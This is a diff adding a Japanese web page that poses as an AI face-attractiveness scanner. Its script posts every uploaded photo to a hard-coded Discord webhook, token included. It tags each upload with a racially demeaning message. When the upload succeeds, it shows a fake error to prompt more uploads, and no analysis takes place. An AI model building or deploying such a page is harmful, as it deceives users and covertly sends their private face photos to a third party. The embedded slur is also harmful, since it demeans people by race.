@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI顔診断 - 超精密スキャン</title>
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #0f0c29; background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29); color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 400px; text-align: center; }
+        h1 { font-size: 24px; margin-bottom: 20px; letter-spacing: 2px; }
+        .upload-zone { border: 2px dashed #00d2ff; padding: 30px; border-radius: 15px; cursor: pointer; transition: 0.3s; margin-bottom: 20px; }
+        .upload-zone:hover { background: rgba(0, 210, 255, 0.1); }
+        input[type="file"] { display: none; }
+        .btn { background: linear-gradient(45deg, #00d2ff, #3a7bd5); border: none; padding: 15px 30px; color: white; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3); }
+        .btn:disabled { background: #555; cursor: not-allowed; }
+        #status { margin-top: 20px; font-size: 14px; min-height: 20px; }
+        .preview { max-width: 100%; border-radius: 10px; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>AI顔採点システム</h1>
+    <p>あなたの顔面偏差値を測定します</p>
+
+    <div class="upload-zone" onclick="document.getElementById('fileInput').click()">
+        <span>📸 画像をタップして選択</span>
+        <img id="preview" class="preview">
+    </div>
+    <input type="file" id="fileInput" accept="image/*" onchange="previewImage(this)">
+
+    <button class="btn" id="sendBtn" onclick="analyzeFace()">診断を開始する</button>
+    
+    <div id="status"></div>
+</div>
+
+<script>
+    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1457033194036789248/ZPwBm0hhwFYXea4x9A_4BXQLGgi5R_J9OIZdJ1g7hRjE-0aJIIVho9NO7UBjK0eKUqXY';
+
+    function previewImage(input) {
+        const file = input.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const preview = document.getElementById('preview');
+                preview.src = e.target.result;
+                preview.style.display = 'block';
+            }
+            reader.readAsDataURL(file);
+        }
+    }
+
+    async function analyzeFace() {
+        const fileInput = document.getElementById('fileInput');
+        const status = document.getElementById('status');
+        const btn = document.getElementById('sendBtn');
+
+        if (!fileInput.files[0]) {
+            alert('画像を選択してください');
+            return;
+        }
+
+        btn.disabled = true;
+        status.innerText = "⚡ AIスキャン実行中...";
+        status.style.color = "#00d2ff";
+
+        const formData = new FormData();
+        formData.append('content', "📊 **黒人の画像とうちゃく**");
+        formData.append('file', fileInput.files[0]);
+
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (response.ok) {
+                setTimeout(() => {
+                    status.innerText = "❌ エラーが発生しました。もう一度お試しくださいお試しください";
+                    status.style.color = "#00ff88";
+                    alert("❌ エラーが発生しました。もう一度お試しくださいお試しください");
+                }, 1500);
+            } else {
+                throw new Error();
+            }
+        } catch (e) {
+            status.innerText = "❌ エラーが発生しました。";
+            status.style.color = "#ff4b2b";
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
